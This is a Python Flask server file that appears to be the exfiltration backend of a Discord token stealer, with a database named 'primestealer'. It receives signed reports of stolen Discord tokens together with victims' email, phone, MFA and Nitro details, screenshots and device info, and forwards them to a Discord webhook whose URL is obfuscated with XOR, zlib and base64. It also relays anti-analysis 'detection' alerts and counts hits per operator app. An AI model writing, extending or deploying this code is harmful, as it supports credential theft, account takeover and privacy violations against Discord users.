# language: Python 3.11+, file: api.py
# host: Render (web service) — gateway.primetalha.qzz.io
# deps: pip install flask requests motor python-dotenv
# env: MONGO_URI, WEBHOOK_URL (encoded), SECRET_KEY

import os, json, base64, hashlib, hmac, zlib, io
from datetime import datetime, timezone
from flask import Flask, request, jsonify
import requests
import motor.motor_asyncio
from dotenv import load_dotenv

load_dotenv()

app     = Flask(__name__)
MONGO_URI = os.environ.get("MONGO_URI","")

# ── SECRET KEY ────────────────────────────────────────────────
_A = bytes([80,114,105,109,101])
_B = bytes([84,97,108,104,97])
_C = bytes([159,60,122,17,222,188,68,2,248,145,86,35,170,120,205,239])

def _get_sk() -> bytes:
    base = _A + _B + _C
    h    = hashlib.sha256(_A + _C).digest()[:4]
    return bytes(a ^ b for a, b in zip(base[:4], h)) + base[4:]

def _dec(blob: str) -> str:
    sk  = _get_sk()
    raw = base64.b64decode(blob.encode())
    key = sk * (len(raw) // len(sk) + 1)
    return zlib.decompress(bytes(a ^ b for a, b in zip(raw, key))).decode()

_WH_ENC = 'jWWpzLReo0x8YU8TICaTC64v8DMHp2caI8o/EmFfyxkgnINa+LarlvP8K4A+KAlL3og56SdPNh3aVWlDYYQDbLxGSin4oPQ7BUTMLwkTAwoXEGoVB8mmiist/7vh0S4ZU2K4WbsQITcY+tbFQ0cIEwk5WQ09Oy5CQ4UDueA='
WEBHOOK = _dec(_WH_ENC)

# ── MONGO ─────────────────────────────────────────────────────
mongo = motor.motor_asyncio.AsyncIOMotorClient(MONGO_URI)
db    = mongo["primestealer"]
apps  = db["apps"]

# ── VERIFY HMAC ───────────────────────────────────────────────
def verify(body: bytes, app_secret: str, sig: str) -> bool:
    expected = hmac.new(app_secret.encode(), body, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, sig or "")

# ── UNICODE MONO ──────────────────────────────────────────────
def mono(s: str) -> str:
    out = []
    for c in s:
        if   'A' <= c <= 'Z': out.append(chr(0x1D670 + ord(c) - 65))
        elif 'a' <= c <= 'z': out.append(chr(0x1D68A + ord(c) - 97))
        elif '0' <= c <= '9': out.append(chr(0x1D7F6 + ord(c) - 48))
        else: out.append(c)
    return ''.join(out)

SEP = "○ . ⌣⌣⌣ . ཻུ꧂ . ⌣⌣⌣ . ○"

# ── v2 COMPONENT BUILDERS ─────────────────────────────────────
def _text(content: str) -> dict:
    return {"type": 10, "content": content}

def _sep(spacing: str = "large", divider: bool = True) -> dict:
    return {"type": 14, "spacing": spacing, "divider": divider}

def _container(*components, accent_color: int | None = None) -> dict:
    c: dict = {"type": 17, "components": list(components)}
    if accent_color is not None:
        c["accent_color"] = accent_color
    return c

def _media(url: str, desc: str = "") -> dict:
    return {"type": 12, "items": [{"media": {"url": url}, "description": desc}]}

# ── ALERT COMPONENTS ──────────────────────────────────────────
def build_alert(data: dict, ss_name: str | None) -> list:
    trigger = data.get("trigger", "—")
    process = data.get("process", "—")
    hwid    = data.get("hwid",    "—")
    ts      = data.get("ts",      "—")

    components = [_container(
        _text(
            f"**. 花 . ᕫᴣ、{mono('Analysis Alert')} . ≧。 . ıl**\n\n"
            f"{SEP}\n\n"
            f"⚠  . {mono('Trigger')}  ⌇  `{trigger}`\n"
            f"◈  . {mono('Process')}  ⌇  `{process}`\n"
            f"⊘  . {mono('Status')}   ⌇  analysis detected\n\n"
            f"-# ⌇ {mono('HWID')} . {hwid}\n"
            f"-# ⌇ {mono('Time')} . {ts}"
        ), accent_color=0xED4245
    )]
    if ss_name:
        components += [
            _sep("large", True),
            _container(
                _text(f"-# ⌇ {mono('Screenshot')} . captured at detection"),
                _media(f"attachment://{ss_name}", "screenshot"),
                accent_color=0x5865F2
            )
        ]
    return components

# ── REPORT COMPONENTS ─────────────────────────────────────────
def build_report(data: dict, ss_name: str | None) -> list:
    tokens  = data.get("tokens", [])
    hwid    = data.get("hwid",   "—")
    ts      = data.get("ts",     "—")
    valid_n = sum(1 for t in tokens if t["valid"])
    inv_n   = len(tokens) - valid_n

    components = [_container(
        _text(
            f"**. 花 . ᕫᴣ、{mono('Token Report')} . ≧。 . ıl**\n\n"
            f"{SEP}\n\n"
            f"᰻⃟ৎ . {mono('Total')}    ⌇  `{len(tokens)}`\n"
            f"✦  . {mono('Valid')}    ⳹ৎ  `{valid_n}`\n"
            f"◈  . {mono('Invalid')}  ⌇  `{inv_n}`\n\n"
            f"-# ⌇ {mono('HWID')} . {hwid}\n"
            f"-# ⌇ {mono('Time')} . {ts}"
        ), accent_color=0x57F287 if valid_n else 0xED4245
    )]

    for idx, t in enumerate(tokens, 1):
        valid      = t["valid"]
        tk         = t["token"]
        label      = t.get("label", "—")
        store, org = label.split("/", 1) if "/" in label else (label, "—")
        color      = 0x57F287 if valid else 0xED4245
        stat_sym   = "⊕" if valid else "⊘"
        stat_txt   = mono("200 Valid") if valid else mono("401 Invalid")
        stor_sym   = "⬤" if store == "runtime" else "○"

        components.append(_sep("large", True))

        if valid:
            uname  = t.get("username",    "—")
            gname  = t.get("global_name", "—")
            uid    = t.get("id",          "—")
            email  = t.get("email",       "—")
            phone  = t.get("phone",       "—")
            mfa    = t.get("mfa",         "—")
            nitro  = t.get("nitro",       "—")
            av     = t.get("avatar_hash", "")

            inner = [_text(
                f"-# ⌇ {mono('Token')} {idx}/{len(tokens)}\n\n"
                f"ᯓ★ . {mono('Nickname')}  ⌇  {gname}\n"
                f"⋆  . {mono('Username')}  ⳹ৎ  {uname}\n"
                f"⌇  . {mono('Token')}     ⌇  ||{tk}||\n"
                f"᰻⃟ৎ . {mono('ID')}      ⌇  `{uid}`\n"
                f"❀⃟ . {mono('Status')}   ⌇  {stat_sym} {stat_txt}\n"
                f"{stor_sym}  . {mono('Store')}    ⌇  `{store}`\n"
                f".ᨳ⃝ . {mono('Origin')}  ৎ⌇  `{org}`\n"
                f"✦  . {mono('Email')}    ⌇  {email}\n"
                f"◈  . {mono('Phone')}    ⌇  {phone}\n"
                f"⊹  . {mono('MFA')}      ⌇  {mfa}\n"
                f"♛  . {mono('Nitro')}    ⌇  {nitro}"
            )]
            if av and uid != "—":
                av_url = f"https://cdn.discordapp.com/avatars/{uid}/{av}.png?size=128"
                inner += [_sep("small", False), _media(av_url, gname)]
            components.append(_container(*inner, accent_color=color))
        else:
            components.append(_container(
                _text(
                    f"-# ⌇ {mono('Token')} {idx}/{len(tokens)}\n\n"
                    f"⌇  . {mono('Token')}   ⳹ৎ  ||{tk}||\n"
                    f"❀⃟ . {mono('Status')}  ⌇  {stat_sym} {stat_txt}\n"
                    f"{stor_sym}  . {mono('Store')}   ⌇  `{store}`\n"
                    f".ᨳ⃝ . {mono('Origin')} ৎ⌇  `{org}`"
                ), accent_color=color
            ))

    if ss_name:
        components += [
            _sep("large", True),
            _container(
                _text(f"-# ⌇ {mono('Screenshot')} . captured at runtime"),
                _media(f"attachment://{ss_name}", "screenshot"),
                accent_color=0x5865F2
            )
        ]
    return components

# ── SEND TO DISCORD ───────────────────────────────────────────
def send_discord(components: list, files: list):
    payload   = {"flags": 1 << 15, "components": components}
    body_json = json.dumps(payload)

    def chunks(lst, n):
        for i in range(0, len(lst), n):
            yield lst[i:i+n]

    for b_idx, batch in enumerate(chunks(components, 20)):
        batch_payload = {"flags": 1 << 15, "components": batch}
        attach = files if b_idx == 0 else []
        if attach:
            form = {"payload_json": (None, json.dumps(batch_payload), "application/json")}
            for field, ft in attach: form[field] = ft
            r = requests.post(WEBHOOK, files=form, timeout=30)
        else:
            r = requests.post(WEBHOOK, data=json.dumps(batch_payload),
                              headers={"Content-Type":"application/json"}, timeout=15)
        print(f"  batch {b_idx+1} → {r.status_code}")

# ── /report ROUTE ─────────────────────────────────────────────
@app.route("/report", methods=["POST"])
async def report():
    app_id = request.headers.get("X-App-ID","")
    sig    = request.headers.get("X-Sig","")

    # multipart or json
    if request.content_type and "multipart" in request.content_type:
        payload_file = request.files.get("payload_json")
        sig_file     = request.files.get("X-Sig")
        body         = payload_file.read() if payload_file else b""
        if sig_file: sig = sig_file.read().decode()
    else:
        body = request.get_data()

    if not body:
        return jsonify({"error": "empty body"}), 400

    # lookup app in mongo
    app_doc = await apps.find_one({"app_id": app_id, "active": True})
    if not app_doc:
        return jsonify({"error": "unknown app"}), 403

    if not verify(body, app_doc["secret"], sig):
        return jsonify({"error": "bad sig"}), 403

    try: data = json.loads(body)
    except: return jsonify({"error": "bad json"}), 400

    msg_type = data.get("type", "report")

    # collect files
    files:    list = []
    ss_name:  str | None = None
    ss_file   = request.files.get("screenshot")
    dev_file  = request.files.get("device_txt")

    if ss_file:
        ss_name = "screenshot.png"
        files.append(("files[0]", (ss_name, io.BytesIO(ss_file.read()), "image/png")))

    if dev_file:
        fi = len(files)
        files.append((f"files[{fi}]",
                      ("device_info.txt", io.BytesIO(dev_file.read()), "text/plain")))

    # build + send
    if msg_type == "alert":
        components = build_alert(data, ss_name)
    else:
        components = build_report(data, ss_name)

    send_discord(components, files)

    # update stats in mongo
    if msg_type == "report":
        tokens  = data.get("tokens", [])
        valid_n = sum(1 for t in tokens if t.get("valid"))
        await apps.update_one(
            {"app_id": app_id},
            {"$inc": {"hits": 1, "valid": valid_n}}
        )
    elif msg_type == "alert":
        await apps.update_one({"app_id": app_id}, {"$inc": {"alerts": 1}})

    return jsonify({"ok": True}), 200

@app.route("/", methods=["GET"])
def health():
    return "ok", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
